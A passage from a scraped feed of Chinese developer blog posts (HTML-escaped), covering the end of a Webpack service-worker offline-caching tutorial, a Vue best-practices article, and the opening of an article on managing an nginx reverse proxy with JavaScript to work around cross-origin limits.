<span class=\"hljs-attr\">entry</span>: {\n    <span class=\"hljs-attr\">app</span>: <span class=\"hljs-string\">'./main.js'</span><span class=\"hljs-comment\">// Chunk app 的 JS 执行入口文件</span>\n  },\n  <span class=\"hljs-attr\">output</span>: {\n    <span class=\"hljs-attr\">filename</span>: <span class=\"hljs-string\">'[name].js'</span>,\n    <span class=\"hljs-attr\">publicPath</span>: <span class=\"hljs-string\">''</span>,\n  },\n  <span class=\"hljs-attr\">module</span>: {\n    <span class=\"hljs-attr\">rules</span>: [\n      {\n        <span class=\"hljs-attr\">test</span>: <span class=\"hljs-regexp\">/\\.css/</span>,<span class=\"hljs-comment\">// 增加对 CSS 文件的支持</span>\n        <span class=\"hljs-comment\">// 提取出 Chunk 中的 CSS 代码到单独的文件中</span>\n        use: ExtractTextPlugin.extract({\n          <span class=\"hljs-attr\">use</span>: [<span class=\"hljs-string\">'css-loader'</span>] <span class=\"hljs-comment\">// 压缩 CSS 代码</span>\n        }),\n      },\n    ]\n  },\n  <span class=\"hljs-attr\">plugins</span>: [\n    <span class=\"hljs-comment\">// 一个 WebPlugin 对应一个 HTML 文件</span>\n    <span class=\"hljs-keyword\">new</span> WebPlugin({\n      <span class=\"hljs-attr\">template</span>: <span class=\"hljs-string\">'./template.html'</span>, <span class=\"hljs-comment\">// HTML 模版文件所在的文件路径</span>\n      filename: <span class=\"hljs-string\">'index.html'</span> <span class=\"hljs-comment\">// 输出的 HTML 的文件名称</span>\n    }),\n    <span class=\"hljs-keyword\">new</span> ExtractTextPlugin({\n      <span class=\"hljs-attr\">filename</span>: <span class=\"hljs-string\">`[name].css`</span>,<span class=\"hljs-comment\">// 给输出的 CSS 文件名称加上 Hash 值</span>\n    }),\n    <span class=\"hljs-keyword\">new</span> ServiceWorkerWebpackPlugin({\n      <span class=\"hljs-comment\">// 自定义的 sw.js 文件所在路径</span>\n      <span class=\"hljs-comment\">// ServiceWorkerWebpackPlugin 会把文件列表注入到生成的 sw.js 中</span>\n      entry: path.join(__dirname, <span class=\"hljs-string\">'sw.js'</span>),\n    }),\n  ],\n  <span class=\"hljs-attr\">devServer</span>: {\n    <span class=\"hljs-comment\">// Service Workers 依赖 HTTPS，使用 DevServer 提供的 HTTPS 功能。</span>\n    https: <span class=\"hljs-literal\">true</span>,\n  }\n};\n</code></pre><p>以上配置有2点需要注意：</p>\n<ul>\n<li>由于 Service Workers 必须在 HTTPS 环境下才能拦截网络请求实现离线缓存，使用在 <a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fwebpack.wuhaolin.cn%2F2%25E9%2585%258D%25E7%25BD%25AE%2F2-6DevServer.html\" rel=\"nofollow noopener noreferrer\">2-6 DevServer https</a> 中提到的方式去实现 HTTPS 服务。</li>\n<li>serviceworker-webpack-plugin 插件为了保证灵活性，允许使用者自定义 <code>sw.js</code>，构建输出的 <code>sw.js</code> 文件中会在头部注入一个变量 <code>serviceWorkerOption.assets</code> 到全局，里面存放着所有需要被缓存的文件的 URL 列表。</li>\n</ul>\n<p>需要修改上面的 <code>sw.js</code> 文件中写成了静态值的 <code>cacheFileList</code> 为如下：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// 需要被缓存的文件的 URL 列表</span>\n<span class=\"hljs-keyword\">var</span> cacheFileList = global.serviceWorkerOption.assets;\n</code></pre><p>以上已经完成所有文件的修改，在重新构建前，先安装新引入的依赖：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">npm i -D serviceworker-webpack-plugin webpack-dev-server\n</code></pre><p>安装成功后，在项目根目录下执行 <code>webpack-dev-server</code> 命令后，DevServer 将以 HTTPS 模式启动，并输出如下日志：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&gt; webpack-dev-server\n\nProject is running at https://localhost:8080/\nwebpack output is served from /\nHash: 402ee6ce5bffb16dffe2\nVersion: webpack 3.5.5\nTime: 619ms\n     Asset       Size  Chunks                    Chunk Names\n    app.js     325 kB       0  [emitted]  [big]  app\n   app.css   21 bytes       0  [emitted]         app\nindex.html  235 bytes          [emitted]         \n     sw.js    4.86 kB          [emitted]         \n</code></pre><p>用 Chrome 浏览器打开网址 <code>https://localhost:8080/index.html</code> 后，就能访问接入了 Service Workers 离线缓存的页面了。</p>\n<h2 class=\"heading\" data-id=\"heading-7\">验证结果</h2>\n<p>为了验证 Service Workers 和缓存生效了，需要通过 Chrome 的开发者工具来查看。</p>\n<p>通过打开开发者工具的 Application-Service Workers 一栏，就能看到当前页面注册的 Service Workers，正常的效果如图：</p>\n<p></p><figure><img alt=\"图3.12.1 查看当前页面注册的 Service Workers\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/23/16083ecc3d9f9acf?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1258\" data-height=\"444\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1258&quot; height=&quot;444&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>通过打开开发者工具的 Application-Cache-Cache Storage 一栏，能看到当前页面缓存的资源列表，正常的效果如图：</p>\n<p></p><figure><img alt=\"图3.12.2 查看当前页面的 Cache Storage\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/23/16083ecc3ec9968c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"284\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;284&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>为了验证网页在离线时能访问的能力，需要在开发者工具中的 Network 一栏中通过 Offline 选项禁用掉网络，再刷新页面能正常访问，并且网络请求的响应都来自 Service Workers，正常的效果如图：</p>\n<p></p><figure><img alt=\"图3.12.3 离线情况下访问页面\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/23/16083ecc41e583aa?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"305\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;305&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<blockquote>\n<p>本实例<a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fwebpack.wuhaolin.cn%2F3-14%25E6%259E%2584%25E5%25BB%25BA%25E7%25A6%25BB%25E7%25BA%25BF%25E5%25BA%2594%25E7%2594%25A8.zip\" rel=\"nofollow noopener noreferrer\">提供项目完整代码</a></p>\n</blockquote>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fwebpack.wuhaolin.cn%2F\" rel=\"nofollow noopener noreferrer\"></a></p><figure><a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fwebpack.wuhaolin.cn%2F\" rel=\"nofollow noopener noreferrer\"><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607259d52144ee4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"802\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;802&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></a></figure><p></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fwebpack.wuhaolin.cn%2F\" rel=\"nofollow noopener noreferrer\">《深入浅出Webpack》全书在线阅读链接</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fwebpack.wuhaolin.cn%2F3%25E5%25AE%259E%25E6%2588%2598%2F3-14%25E6%259E%2584%25E5%25BB%25BA%25E7%25A6%25BB%25E7%25BA%25BF%25E5%25BA%2594%25E7%2594%25A8.html\" rel=\"nofollow noopener noreferrer\">阅读原文</a></p>\n</div>"},{"title":"关于 vue 全家桶的四个 “最佳实践”","avatar":"https://user-gold-cdn.xitu.io/2017/11/1/b8355d562fcb34f833f6463fff669aeb?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"丁香园F2E","create_time":"2017 年 12 月 23 日","tags":["Vue.js"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h1 class=\"heading\" data-id=\"heading-0\">前言</h1>\n<p>在读这篇文章之前，我想先安利大家一个东西：\n</p><figure><img alt=\"Vue.js 组件编码规范\" class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/22/1607c25dec59cc58?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"463\" data-height=\"463\" src=\"https://user-gold-cdn.xitu.io/2017/12/22/1607c25dec59cc58?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<p>看到这副黑框眼镜，你是不是想到了什么？</p>\n<p>对，就是它：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fpablohpsilva%2Fvuejs-component-style-guide%2Fblob%2Fmaster%2FREADME-CN.md\" rel=\"nofollow noopener noreferrer\">Vue.js 组件编码规范</a>。读过的同学忽略，没读过的同学有时间的话请花 20 分钟认真看看，文章的内容都是在认可这篇规范的基础上展开的。</p>\n<p>另外，本文中的“最佳实践”（注意引号），全都是一家之言，不一定对，欢迎各路大佬讨论拍砖。</p>\n<h2 class=\"heading\" data-id=\"heading-1\">实践一：如何分类组件</h2>\n<p>组件（component）是 vue 最核心的概念之一，但是正因为这一概念太过宽泛，我们会在实际开发中看到各种各样的组件，对开发和维护的同学带来了很大的困惑和混乱。这里我把组件分成四类：</p>\n<h3 class=\"heading\" data-id=\"heading-2\">view</h3>\n<p>顾名思义，view 指的是页面，你也可以把它叫做 page。它的定义是：和具体的某一条路由对应，在 vue-router 配置中指定。view 是页面的容器，是其他组件的入口。它可以和 vuex store 通信，再把数据分发给普通组件。</p>\n<h3 class=\"heading\" data-id=\"heading-3\">global component</h3>\n<p>全局组件，作为小工具而存在。例如 toast、alert 等。他的特点是具备全局性，直接嵌套在 root 下，而不从属于哪个 view。global component 也和 vuex store 通信，它单独地使用 state 中的一个 module，这个 state 中的数据专门用来控制 gloabl component 的显隐和展示，不和其他业务实体用到的 state 混淆。<br>\n其他组件想修改它，可以直接派发相应的 mutation。而要监听它的变化（比如一个全局的confirm，确认之后在不同的组件中触发不同的操作），则使用全局事件总线（event bus）。</p>\n<h3 class=\"heading\" data-id=\"heading-4\">simple component</h3>\n<p>简单组件。这种组件对应的是 vue 中最传统的组件概念。它的交互和数据都不多，基本上就是起到一个简单展示，拆分父组件的作用。这种组件和父组件之间通过最传统的方式进行通讯：父组件将 props 传入它，而它通过 $emit 触发事件到父组件。<br>\n简单组件内部是不写什么业务逻辑的，它可以说是生活不能自理，要展示什么就等着父组件传入，要干什么就 $emit 事件出去让父组件干，父组件够操心的。</p>\n<h3 class=\"heading\" data-id=\"heading-5\">complex component</h3>\n<p>复杂组件。这种组件的特点是，内部包含有很多交互逻辑，常常需要访问接口。另外，展示的数据也往往比较多。如下图。</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/22/1607d5d47b481aec?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1202\" data-height=\"940\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1202&quot; height=&quot;940&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure>\n图中红框内部的就是一个复杂组件的实例。它是一个大列表的列表项，展示的数据很多，而且点击左下角的几个 button，还会弹出相应的弹窗，弹窗内有复杂的表单需要填写提交···逻辑可以说是相当复杂了。如果这时我们还拘泥于简单组件的那种通信方式，衣来伸手饭来张口，啥事儿不干，那么：<br>\n1.所有的 props 都由父组件一一传入，如果有十几个乃至几十个要展示的数据，那么父组件 <code>&lt;template&gt;</code> 内的代码可不得上天了？<br>\n2.所有的业务流程都要 $emit 出去要父组件处理，那么父组件 <code>&lt;script&gt;</code> 内的代码可不得上天了？<br>\n所以，对于这种复杂组件，我们应该允许它有一定的“自主权”。可以跳过父组件，自行和 vuex 通信，获取一下 state，派发一下 mutation 和 action，不是很开心么。<p></p>\n<p>我画了一张图来说明上面这四种 component 的关系，希望能帮助大家更好理解。</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/22/1607d897d070780a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"780\" data-height=\"542\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;780&quot; height=&quot;542&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>在区分了这四种 component 后，我们在编码时就能做到心里有数，现在在写的组件，到底属于哪一类？每一类以特定的方式编写和交互，逻辑上就会清晰很多。\n使用 vue-cli 构建的项目中都会有一个目录叫做 component，以前是一股脑往里塞，现在可以在此基础上再设置几个子目录，放置不同类型的组件。</p>\n<h2 class=\"heading\" data-id=\"heading-6\">实践二：如何优雅地修改 props</h2>\n<p>先来看一个栗子🌰<br>\n假设有一个模态对话框的组件。父组件为了能够打开模态框，给模态框传入了一个控制其显隐的 props，命名为 visible，type 为 Boolean，绑定模态框外层的 v-if 指令。那么，问题来了，如果我们点击了模态框内部的关闭按钮，关闭自身，应该怎么写？<br>\n当然，最传统的方式自然还是模态框抛出事件，父组件中设置监听，然后修改值。但这种方式无疑有很强的侵入性，无端增加了很多的代码量。关闭按钮在模态框内部，关闭自己是我自己的事儿，能不能不让父组件管这些？<br>\n有同学说了，直接在模态框内部修改 visible 啊。<code>this.visible = false</code> ，不行吗？<br>\n还真不行。如果这么干，你会看到以下一堆报错：</p>\n<blockquote>\n<p>[Vue warn]: Avoid mutating a prop directly since the value will be overwritten whenever the parent component re-renders. Instead, use a data or computed property based on the prop's value.</p>\n</blockquote>\n<p>vue 很明确地告诉你了，作为子组件，你要安分守己，不许随便修改老爹传给你的 props。<br>\n那么我们应该怎么办？</p>\n<h3 class=\"heading\" data-id=\"heading-7\">方法一</h3>\n<p>我们思考一下，如果不允许修改 props 的值，那我们修改 porps 的······属性如何？<br>\n事实证明，是可以的。<br>\n我们可以把上面 visible 的 type 设为 Object，模态框的显隐决定于 visible.value。当模态框想要关闭自身时，只需 <code>this.visible.value = false</code> 即可。\n这种方式看起来相当方便，但实际是一种投机取巧的方法。上面安利的 Vue.js 组件编码规范中明确有一条规范，就是 props 原子化，也就是说，props 里的字段必须是简单的 String，Number 或 Boolean。这么做的原因是：</p>\n<ul>\n<li>使得组件 API 清晰直观。</li>\n<li>只使用原始类型和函数作为 props 使得组件的 API 更接近于 HTML(5) 原生元素。</li>\n<li>其它开发者更好的理解每一个 prop 的含义、作用。</li>\n<li>传递过于复杂的对象使得我们不能够清楚的知道哪些属性或方法被自定义组件使用，这使得代码难以重构和维护。</li>\n</ul>\n<p>所以，我们把 visible 改为 Object，本来就是违反规范的。</p>\n<h3 class=\"heading\" data-id=\"heading-8\">方法二</h3>\n<p>vue 中有种已经存在的机制，和现有需求很像，这就是 v-model。在表单中，每一个 input，就像一个子组件。在外层通过 v-model 绑定的值可以在 input 中回显，而 input 本身的值也能改变。<br>\n事实上，v-model 仅仅是一个语法糖，<code>v-model=\"xxx\"</code>,就相当于 <code>:value=\"xxx\" @input=\"val=&gt;xxx=val\"</code>。那么，我们就可以利用 v-model 的这种特性来实现我们的需求。我们只需要在模态框内部抛出一个 input 事件 <code>this.$emit('input', false)</code>,就能关闭自身了。<br>\n这种方式比较简洁，也不违反规范，但是容易让人困惑，以为这里是要进行什么表单操作。<br>\n我们还有没有什么更好的方式呢？</p>\n<h3 class=\"heading\" data-id=\"heading-9\">方法三</h3>\n<p>如果你是从大版本为 1 时就开始接触 vue，那你可以知道一个修饰符，叫做.sync。如果你是从 2.0 开始接触的，则很可能不熟悉它。这是因为，vue 在 2.0 版本时把它删除了，不过好在， 2.3 版本之后，<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fcn.vuejs.org%2Fv2%2Fguide%2Fcomponents.html%23sync-%25E4%25BF%25AE%25E9%25A5%25B0%25E7%25AC%25A6\" rel=\"nofollow noopener noreferrer\">它又回来了</a>。<br>\n这个修饰符简直就是为我们这个需求量身定制的。它本身是一个和 v-model 类似的语法糖，我们要做的，仅仅是在组件内部需要改动值的地方，抛出一个 update 事件。<code>this.$emit('update:foo', newValue)</code>。既不违反规范，也足够清晰，可以说是最佳的解决方案了。唯一的不足之处，就是对版本有一点要求。</p>\n<h2 class=\"heading\" data-id=\"heading-10\">实践三：如何封装请求接口</h2>\n<p>数据是 SPA 的核心，而数据的来源都是接口。如何优雅、高效地通过接口请求数据，是开发者必须要关心的问题。在实践中，我是这样封装接口的：\n</p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/23/160812ea96ca6815?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"307\" data-height=\"599\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;307&quot; height=&quot;599&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure>\n从高层到底层，依次说明。<br>\n第一层就是组件。<br>\n第二层则是 vuex 中的 action，我们在组件中调用 action，基本操作。<br>\n第三层是 api。在这里，我们预先定义了每一个接口。包括接口的 url、type、content-type，以及写死的请求参数。在 action 中，我们调用 api 请求接口。<br>\n第四层是 request，这是我们请求的公共方法，作用就是对特定的 http client。   进行封装，实现一套统一的接口请求——处理流程。<br>\n第五层则是以 axios 为代表的各种 http client。<br>\n我们主要进行编码的是第三层和第四层，也就是 api 和 request。api 的编写没有什么难点，主要谈谈 request 的代码。这部分代码，我们要关心以下几个方面。<p></p>\n<ul>\n<li>loading 处理。当请求时间比较长时，要跳出全局的 loading 让用户知晓。</li>\n<li>错误处理。有两种错误，第一种是 http 请求直接返回错误码。第二种，虽然请求的返回值是 200，但是返回结果中提示错误。比如返回的 json 中 <code>success: false</code>。对于这两种错误，我们都要捕获并处理。</li>\n<li>api 一致性处理。http client 接受的参数是有讲究的，以 axios为例，get 请求的请求参数为 params，而 post 请求的参数则为 data。对于这种差异，request 这层需要将其抹平，api 层不需要在定义接口时关心这些。</li>\n</ul>\n<p>下面是示例代码，可供参考。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">  <span class=\"hljs-keyword\">if</span> (opt.method === <span class=\"hljs-string\">'post'</span>) {\n    axiosOpt.data = opt.payload\n  } <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (opt.method === <span class=\"hljs-string\">'get'</span>) {\n    axiosOpt.params = opt.payload\n  }\n  <span class=\"hljs-keyword\">if</span> (opt.withFile) {\n    Object.assign(axiosOpt, { headers: {\n      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'multipart/form-data'</span>\n    }})\n  }\n\n  // 全局请求的 loading，当请求 300 ms 后还没返回，才会出现 loading\n  const timer = <span class=\"hljs-built_in\">set</span>Timeout(() =&gt; {\n    store.dispatch(<span class=\"hljs-string\">'showLoading'</span>, {\n      text: <span class=\"hljs-string\">'加载数据中'</span>\n    })\n  }, 300)\n\n  try {\n    // 开始请求\n    const result = await axios(axiosOpt)\n    // 如果 300 ms 还没到，就取消定时器\n    clearTimeout(timer)\n    store.dispatch(<span class=\"hljs-string\">'closeLoading'</span>)\n\n    <span class=\"hljs-keyword\">if</span> (result.status === 200 &amp;&amp; result.statusText === <span class=\"hljs-string\">'OK'</span>) {\n      <span class=\"hljs-keyword\">if</span> (result.data.success) {\n        <span class=\"hljs-built_in\">return</span> result.data.results || <span class=\"hljs-literal\">true</span>\n      } <span class=\"hljs-keyword\">else</span> {\n        // 请求失败的 toast\n        store.dispatch(<span class=\"hljs-string\">'showAlert'</span>, {\n          <span class=\"hljs-built_in\">type</span>: <span class=\"hljs-string\">'error'</span>,\n          text: `请求失败<span class=\"hljs-variable\">${result.data.message ? `,信息：${result.data.message}</span>`: <span class=\"hljs-string\">''</span>}`\n        })\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">false</span>\n      }\n    } <span class=\"hljs-keyword\">else</span> {\n      <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">false</span>\n    }\n  } catch(e) {\n    clearInterval(timer)\n    // 请求失败的 toast\n    store.dispatch(<span class=\"hljs-string\">'closeLoading'</span>)\n    store.dispatch(<span class=\"hljs-string\">'showAlert'</span>, {\n      <span class=\"hljs-built_in\">type</span>: <span class=\"hljs-string\">'error'</span>,\n      text: <span class=\"hljs-string\">'请求失败'</span>\n    })\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">false</span>\n  }\n</code></pre><h2 class=\"heading\" data-id=\"heading-11\">实践四：如何决定请求数据的时机</h2>\n<p>SPA中，每一个 view 中的都有很多数据是需要通过接口请求获得的，如果没有获得，页面中就会有很多空白。上面，我们讨论了如何封装好接口请求，下一步就是决定什么时候请求初始化数据，即，代码在哪里写的问题。实践下来，有两个时机是比较理想的。</p>\n<h3 class=\"heading\" data-id=\"heading-12\">beforeRouteEnter/Update</h3>\n<p>vue-router 提供了以上两个生命周期钩子，分别会在进入路由和路由改变时触发。这两个钩子是写的 view 中的。</p>\n<h3 class=\"heading\" data-id=\"heading-13\">router.beforeEach</h3>\n<p>vue-router还提供了一个全局性的 beforeEach 方法，任何一个路由改变时，都会被这个方法拦截，我们可以在这个方法中加入我们自己的代码，做统一处理。比如，对于所有 view 初始化请求的 action，我们可以以特定的名称命名，如以 _init 作为后缀等。在 beforeEach 方法内，我们对当前 view 对应的 store 进行监听，查找到其中以 _init 命名的 action 并派发。<br>\n以上两种方式各有特点。<br>\n对于前者，优点是数据获取的代码和具体的 view 是绑定在一起的，我们可以在 view 内部就清晰地看到数据获取的流程。缺点是，每增加一个页面，都要在其内部写一堆初始化代码，增加了代码量。\n对于后者。优点是，代码统一且规整，使用了配置的方式，写一次即可，不需要每次增加额外的代码。缺点是比较隐晦，且初始化代码和 view 本身割裂了。<br>\n对于以上两种方式如何取舍的问题，我倾向于，大型项目用后者，小型项目用前者。</p>\n<h2 class=\"heading\" data-id=\"heading-14\">Other Tips</h2>\n<ul>\n<li>多使用 mixing，能够在组件级别抽离公共部分，减少冗余，极好的机制。</li>\n<li>多使用常量，这点和 vue 本身没有关系，但是能极大地提升代码的健壮性。</li>\n<li>链接如果是在项目内部跳转，多使用 ，而不是去拼 a 标签的 href。</li>\n<li>不要用 dom 操作。但如果迫不得已，比如你要获得某个 dom 的 scrollTop 属性，用 $ref,而不是用选择器去取。</li>\n<li>能想到的就这些，欢迎大佬们讨论补充。</li>\n</ul>\n<blockquote>\n<p>作者：丁香园前端团队-㍿社长</p>\n</blockquote>\n</div>"},{"title":"JS维护nginx反向代理，妈妈再也不用担心我跨域了！","avatar":"https://user-gold-cdn.xitu.io/2017/11/22/15fe236ad49db2aa?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"清一色天空","create_time":"2017 年 12 月 20 日","tags":["Node.js","JavaScript","前端","Nginx"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 class=\"heading\" data-id=\"heading-0\">一些废话（直接看代码的可跳过）</h2>\n<p>“跨域了，咋搞啊！”</p>\n<p>“问你自己啊，我们后台不配合解决的。”</p>\n<p>“你们写几句话就好了啊，cors、jsonp、header ......”</p>\n<p>“搞不来！不合法！不安全！......”</p>\n<p>“卧槽，这接口又跨域了，我CNMLGB”</p>\n<p>“你TM不会自己url-get、form-post、写nginx代理啊！”\n......</p>\n<pre><code>几个月后\n</code></pre>\n<p>“这接口跨域了！”</p>\n<p>“写反向代理啊，上次你不是弄过吗？”</p>\n<p>“我TM早忘了......”</p>\n<p>如果你无论如何都得仍受并面对这样的后台小伙伴的话，那这篇文章来解救你了，让你的nginx配置信息管理的又简单，又清晰，而且fork一下github随时都不会忘了呢~</p>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-1\">面向读者</h3>\n<ol>\n<li>无论如何都si不配合跨域的后台儿子们</li>\n<li>总忘记咋配置nginx代理的前端爸爸们</li>\n<li>老想跨域干些heiheihei的爬虫绅士们</li>\n<li>想解决或想了解跨域问题的萌新们\n......</li>\n</ol>\n<h3 class=\"heading\" data-id=\"heading-2\">想要达到的目的</h3>\n<ol>\n<li>只用<strong>一句命令行</strong>来执行配置文件的<strong>创建、修改</strong></li>\n<li>JS配置<strong>简单明了</strong>，不会JS的小伙伴懂json格式就能<strong>轻易维护</strong></li>\n</ol>\n<p></p><figure><img alt=\"配置内容\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde6d3c5211?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"728\" data-height=\"390\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;728&quot; height=&quot;390&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<ol start=\"3\">\n<li>对于水平稍高的朋友们可对代码进行<strong>二次开发</strong></li>\n<li><strong>跨域不再困难</strong></li>\n</ol>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-3\">需要的工具</h3>\n<ul>\n<li><strong>node</strong></li>\n<li><strong>cmd（命令指示符）</strong></li>\n</ul>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-4\">Tips</h3>\n<pre><code>以下内容会以初学者的角度进行并言简意赅的方式急速说明，掌握者可以跳着看\n</code></pre>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-5\">在开始之前您可能需要初步了解这些东西</h2>\n<h4 class=\"heading\" data-id=\"heading-6\"><strong>1. 什么是正向/反向代理</strong></h4>\n<h4 class=\"heading\" data-id=\"heading-7\"><strong>2. 什么是跨域</strong></h4>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-8\">1）什么是正向/反向代理</h3>\n<h4 class=\"heading\" data-id=\"heading-9\"><strong>正向代理：</strong></h4>\n<p>我要拿C的数据，但请求不到C（例如谷歌），不过我知道B是能请求到C的，于是我去告诉B，B帮我拿回了C的数据，有点翻墙的意思。敲黑板，划重点（<strong>C只知道B是他的小伙伴，并不知道A是谁</strong>）</p>\n<h4 class=\"heading\" data-id=\"heading-10\"><strong>反向代理：</strong></h4>\n<p>我又要去拿C的数据了，不过这次运气好，C我能直接访问到（比如百度），那很棒哦，我自己搭建了个服务器B，B帮我拿回了C的数据。敲黑板，划重点（<strong>C并不知道B是他的小伙伴，因为AB是一伙的</strong>）</p>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-11\">2）什么是跨域</h3>\n<pre><code>请求非自身(地址||端口)都算跨域\n</code></pre>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-12\">写一个非自身地址的AJAX的请求（起步）</h2>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-13\">步骤一：找接口</h3>\n<p>首先咋们开始在网站上找各种接口，那我这边找了一个百度贴吧的post接口</p>\n<h4 class=\"heading\" data-id=\"heading-14\"><strong>请求头</strong></h4>\n<p></p><figure><img alt=\"贴吧post请求图 --- 请求头\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde68ed9b6b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"751\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;751&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h4 class=\"heading\" data-id=\"heading-15\"><strong>请求值</strong></h4>\n<p></p><figure><img alt=\"贴吧post请求图 --- 请求值\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde6305f8f6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"561\" data-height=\"300\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;561&quot; height=&quot;300&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h4 class=\"heading\" data-id=\"heading-16\"><strong>返回值</strong></h4>\n<p></p><figure><img alt=\"贴吧post请求图 --- 返回值\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071fde71e6c7bb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"742\" data-height=\"452\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg 